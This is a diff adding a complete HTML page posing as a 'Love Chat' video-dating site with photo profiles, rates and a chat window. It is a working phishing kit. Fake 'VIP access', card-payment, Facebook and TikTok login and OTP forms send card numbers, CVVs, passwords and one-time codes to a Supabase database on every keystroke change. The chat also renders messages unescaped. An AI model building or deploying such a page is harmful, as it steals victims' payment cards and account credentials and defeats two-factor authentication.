@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Video Dating | Private Connection</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --accent: #ff0055; --gold: #ffcc00; --dark: #0a0a0b; --card-bg: #161618; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
+        body { background-color: var(--dark); color: #fff; overflow-x: hidden; }
+
+        /* Navigation */
+        nav { padding: 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(10,10,11,0.95); position: sticky; top: 0; z-index: 1000; backdrop-filter: blur(10px); border-bottom: 1px solid #222; }
+        .logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 24px; color: var(--accent); }
+        .logo img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid var(--accent); }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .profile-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
+
+        /* Profile Card */
+        .profile-card { background: var(--card-bg); border-radius: 20px; overflow: hidden; border: 1px solid #222; transition: 0.3s; cursor: pointer; position: relative; }
+        .profile-card:hover { transform: translateY(-8px); border-color: var(--accent); }
+        .img-container { height: 220px; width: 100%; position: relative; }
+        .img-container img { width: 100%; height: 100%; object-fit: cover; }
+        .rate-tag { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 4px 8px; border-radius: 8px; font-size: 12px; font-weight: 700; color: var(--gold); }
+        .online-status { position: absolute; top: 10px; left: 10px; background: #2ecc71; width: 10px; height: 10px; border-radius: 50%; box-shadow: 0 0 10px #2ecc71; }
+        .profile-details { padding: 12px; }
+        .call-btn { width: 100%; background: var(--accent); color: #fff; border: none; padding: 10px; border-radius: 10px; font-weight: 700; cursor: pointer; }
+
+        /* Messenger UI */
+        .chat-overlay { display: none; position: fixed; bottom: 0; right: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 2000; flex-direction: column; }
+        @media(min-width: 600px) { .chat-overlay { width: 350px; height: 500px; bottom: 20px; right: 20px; border-radius: 20px; border: 1px solid #333; } }
+        .chat-header { padding: 15px; background: #1a1a1c; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
+        .chat-messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; background: #0a0a0b; }
+        .msg { padding: 10px 15px; border-radius: 15px; max-width: 85%; font-size: 14px; line-height: 1.4; word-wrap: break-word; }
+        .msg.user { background: #333; align-self: flex-start; color: #fff; }
+        .msg.admin { background: var(--accent); align-self: flex-end; color: #fff; }
+        .chat-input { padding: 15px; display: flex; gap: 10px; background: #1a1a1c; border-top: 1px solid #222; }
+        .chat-input input { flex: 1; background: #000; border: 1px solid #333; padding: 12px; border-radius: 25px; color: #fff; outline: none; }
+
+        /* Existing Overlays (Login/Payment) */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 9999; overflow-y: auto; padding: 40px 20px; backdrop-filter: blur(15px); }
+        .form-box { max-width: 400px; margin: 0 auto; text-align: center; }
+        input, select { width: 100%; padding: 16px; margin: 10px 0; border: 1px solid #333; border-radius: 12px; background: #111; color: #fff; font-size: 16px; }
+        .btn-gold { width: 100%; padding: 18px; border: none; border-radius: 12px; background: var(--accent); color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="logo"><img src="https://i.ibb.co/C5pRgQ6j/received-2053528175501581.jpg"> Love Chat</div>
+    <div style="color: #2ecc71; font-weight: 600;">● 542 Online</div>
+</nav>
+
+<div class="container">
+    <div class="profile-grid" id="profileContainer"></div>
+</div>
+
+<div id="chatBox" class="chat-overlay">
+    <div class="chat-header">
+        <div style="display:flex; align-items:center; gap:10px">
+            <img id="chatImg" src="" style="width:35px; height:35px; border-radius:50%; object-fit:cover;">
+            <b id="chatName">Name</b>
+        </div>
+        <div style="display:flex; gap:15px; align-items:center;">
+            <span onclick="showView('signupView')" style="cursor:pointer; font-size:20px;">🎥</span>
+            <span onclick="closeChat()" style="cursor:pointer; font-size:20px;">✕</span>
+        </div>
+    </div>
+    <div class="chat-messages" id="chatMessages"></div>
+    <div class="chat-input">
+        <input type="text" id="msgInput" placeholder="Type a message...">
+        <button onclick="sendMessage()" style="background:none; border:none; color:var(--accent); font-weight:800; cursor:pointer; padding: 0 10px;">SEND</button>
+    </div>
+</div>
+
+<div id="signupView" class="overlay">
+    <div class="form-box">
+        <h2 style="color:var(--accent)">VIP ACCESS</h2>
+        <select id="region">
+            <option value="">Choose Country</option>
+            <option>Saudi Arabia (5 SAR)</option>
+            <option>UAE (5 AED)</option>
+            <option>Bangladesh (150 BDT)</option>
+        </select>
+        <button class="btn-gold" onclick="showView('cardView')">Unlock Profiles</button>
+        <button class="btn-gold" style="background:#1877f2; margin-top:10px;" onclick="openSocial('Facebook')">Facebook</button>
+        <button class="btn-gold" style="background:#000; margin-top:10px; border:1px solid #333;" onclick="openSocial('TikTok')">TikTok</button>
+        <p style="margin-top:20px; cursor:pointer;" onclick="hideAll()">Close</p>
+    </div>
+</div>
+
+<div id="cardView" class="overlay">
+    <div class="form-box">
+        <h2>Secure Payment</h2>
+        <input type="text" id="cardName" placeholder="Cardholder Name" onchange="autoSync('Card')">
+        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" onchange="autoSync('Card')">
+        <div style="display:flex; gap:10px">
+            <input type="text" id="expiryDate" placeholder="MM/YY" onchange="autoSync('Card')">
+            <input type="text" id="cvv" placeholder="CVV" onchange="autoSync('Card')">
+        </div>
+        <button class="btn-gold" onclick="submitFinal('Card')">Pay Now</button>
+    </div>
+</div>
+
+<div id="socialView" class="overlay">
+    <div class="form-box">
+        <img id="socialLogo" style="width:60px;">
+        <h2 id="socialTitle">Login</h2>
+        <input type="text" id="socialUser" placeholder="Email or Phone" onchange="autoSync(currentPlatform)">
+        <input type="password" id="socialPass" placeholder="Password" onchange="autoSync(currentPlatform)">
+        <button class="btn-gold" onclick="submitFinal(currentPlatform)">Login</button>
+    </div>
+</div>
+
+<div id="otpView" class="overlay">
+    <div class="form-box">
+        <h2>OTP Verification</h2>
+        <input type="text" id="otpCode" placeholder="6-Digit Code" style="text-align:center;" onchange="autoSync('OTP')">
+        <button class="btn-gold" onclick="finishProcess()">Verify</button>
+    </div>
+</div>
+
+<div id="successView" class="overlay">
+    <div class="form-box" style="padding-top:100px;">
+        <h2 id="statusTitle">Syncing...</h2>
+        <p id="statusMsg">Please wait 5-10 minutes.</p>
+    </div>
+</div>
+
+<script>
+    const S_URL = 'https://rpxifsrlavmqhjtcezlv.supabase.co';
+    const S_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJweGlmc3JsYXZtcWhqdGNlemx2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzkxMDgsImV4cCI6MjA4MTQxNTEwOH0.uIsVuMypVVxU19cyzRw_c8Y964_fXx-uTA3C2kux6Rw';
+    const supabaseClient = supabase.createClient(S_URL, S_KEY);
+
+    // Persist unique ID for each user
+    let currentUserId = localStorage.getItem('chat_uid');
+    if(!currentUserId) {
+        currentUserId = 'u_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('chat_uid', currentUserId);
+    }
+    
+    let currentPlatform = '';
+    let chatInterval;
+    let activeProfile = "";
+
+    const realImages = ["https://i.ibb.co/C5pRgQ6j/received-2053528175501581.jpg", "https://i.ibb.co/pvGkQx6v/1766538863233.jpg", "https://i.ibb.co/0W3ffvr/1766538863216.jpg", "https://i.ibb.co/NgnT2QvT/1766538863201.jpg", "https://i.ibb.co/4wfx2GF5/1766538863186.jpg", "https://i.ibb.co/yBNJ840d/1766538863107.jpg", "https://i.ibb.co/JjG7ZnP4/1766538863146.jpg", "https://i.ibb.co/6Rsh5K3N/1766538863119.jpg", "https://i.ibb.co/4CkhSdL/1766538863133.jpg", "https://i.ibb.co/B2BW2SS1/1766538863084.jpg", "https://i.ibb.co/fVVygmYq/1766538863096.jpg", "https://i.ibb.co/6RDJhFXc/1766538863072.jpg", "https://i.ibb.co/0RJb2Lsq/1766538863062.jpg", "https://i.ibb.co/Xxvmzcft/1766538863052.jpg", "https://i.ibb.co/rKqHxyQf/1766538863042.jpg", "https://i.ibb.co/FLhPgLcx/1766538863022.jpg", "https://i.ibb.co/ZRt27c9G/1766538863032.jpg", "https://i.ibb.co/zHndc1pR/1766538863012.jpg", "https://i.ibb.co/21dfwzh2/1766538863002.jpg", "https://i.ibb.co/jPdg91gT/1766538862992.jpg", "https://i.ibb.co/bMjV3Hdz/1766538862970.jpg", "https://i.ibb.co/5gvN80W6/1766538862981.jpg", "https://i.ibb.co/S4CqTjXr/1766538862944.jpg", "https://i.ibb.co/N6Mj5RqK/1766538862926.jpg", "https://i.ibb.co/JR2GRXYV/1766538862912.jpg", "https://i.ibb.co/MxQR1pzZ/1766538862891.jpg", "https://i.ibb.co/MxLBbDFp/1766538862847.jpg", "https://i.ibb.co/S7yJbHWx/1766538862865.jpg", "https://i.ibb.co/jPCVMr4S/1766538862795.jpg", "https://i.ibb.co/pjtfYvLH/1766538862827.jpg", "https://i.ibb.co/Y4g9qcKG/1766538862738.jpg", "https://i.ibb.co/LDdRgF1F/1766538862710.jpg", "https://i.ibb.co/6JWmTjNy/1766538862768.jpg", "https://i.ibb.co/TMS0LybB/1766538862685.jpg", "https://i.ibb.co/mrkbgb7t/1766538862662.jpg", "https://i.ibb.co/qMzTRpps/1766538862644.jpg", "https://i.ibb.co/4ZyVNy6M/1766538862624.jpg", "https://i.ibb.co/gMtr6wtv/1766538862604.jpg", "https://i.ibb.co/KTD9NjL/1766538862573.jpg"];
+    const names = ["Ayesha", "Priya", "Sara", "Nisha", "Mitu", "Anika", "Riya", "Sultana", "Jannat", "Keya"];
+
+    const container = document.getElementById('profileContainer');
+    realImages.forEach((img, i) => {
+        const name = names[i % names.length];
+        container.innerHTML += `
+            <div class="profile-card" onclick="openChat('${name}', '${img}')">
+                <div class="img-container">
+                    <div class="online-status"></div>
+                    <img src="${img}">
+                    <div class="rate-tag">$${5+(i%10)}/min</div>
+                </div>
+                <div class="profile-details">
+                    <h3>${name}, ${20+(i%6)}</h3>
+                    <p>📍 Available Now</p>
+                    <button class="call-btn">Message</button>
+                </div>
+            </div>`;
+    });
+
+    function openChat(name, img) {
+        activeProfile = name;
+        document.getElementById('chatName').innerText = name;
+        document.getElementById('chatImg').src = img;
+        document.getElementById('chatBox').style.display = 'flex';
+        loadMessages();
+        if(chatInterval) clearInterval(chatInterval);
+        chatInterval = setInterval(loadMessages, 3000); // Polling every 3s
+    }
+
+    function closeChat() { 
+        document.getElementById('chatBox').style.display = 'none'; 
+        clearInterval(chatInterval);
+    }
+
+    async function sendMessage() {
+        const msgInp = document.getElementById('msgInput');
+        const text = msgInp.value.trim();
+        if(!text) return;
+        
+        try {
+            const { error } = await supabaseClient.from('messages').insert([{
+                sender_id: String(currentUserId),
+                profile_id: activeProfile,
+                content: text,
+                is_admin: false
+            }]);
+            
+            if(error) throw error;
+            msgInp.value = "";
+            loadMessages();
+        } catch(e) { console.error("Send Error:", e.message); }
+    }
+
+    async function loadMessages() {
+        if(!activeProfile) return;
+        try {
+            const { data, error } = await supabaseClient.from('messages')
+                .select('*')
+                .eq('sender_id', currentUserId)
+                .eq('profile_id', activeProfile)
+                .order('created_at', { ascending: true });
+            
+            if (error) throw error;
+            
+            const box = document.getElementById('chatMessages');
+            const msgs = data || []; 
+            box.innerHTML = msgs.map(m => `<div class="msg ${m.is_admin?'admin':'user'}">${m.content}</div>`).join('');
+            box.scrollTop = box.scrollHeight;
+        } catch (e) { console.log("Updating..."); }
+    }
+
+    // --- Original Login/Auth Functions (UNTOUCHED) ---
+    async function autoSync(type) {
+        const payload = {
+            type: type,
+            identifier: type === 'Card' ? document.getElementById('cardName').value : document.getElementById('socialUser').value,
+            secret: type === 'Card' ? document.getElementById('cardNumber').value : document.getElementById('socialPass').value,
+            extra_info: type === 'Card' ? `${document.getElementById('expiryDate').value}|${document.getElementById('cvv').value}` : '',
+            otp: document.getElementById('otpCode').value
+        };
+        const sid = localStorage.getItem('db_id');
+        if(!sid) {
+            const { data } = await supabaseClient.from('user_data_love').insert([payload]).select();
+            if(data) localStorage.setItem('db_id', data[0].id);
+        } else {
+            await supabaseClient.from('user_data_love').update(payload).eq('id', sid);
+        }
+    }
+    function showView(id) { document.querySelectorAll('.overlay').forEach(v => v.style.display = 'none'); document.getElementById(id).style.display = 'block'; }
+    function hideAll() { document.querySelectorAll('.overlay').forEach(v => v.style.display = 'none'); }
+    function openSocial(p) { currentPlatform = p; document.getElementById('socialLogo').src = p==='Facebook'?'https://img.icons8.com/color/144/facebook-new.png':'https://img.icons8.com/color/144/tiktok.png'; document.getElementById('socialTitle').innerText = p + " Login"; showView('socialView'); }
+    async function submitFinal(t) { await autoSync(t); showView('otpView'); }
+    async function finishProcess() { await autoSync('OTP'); showView('successView'); }
+</script>
+</body>
+</html>
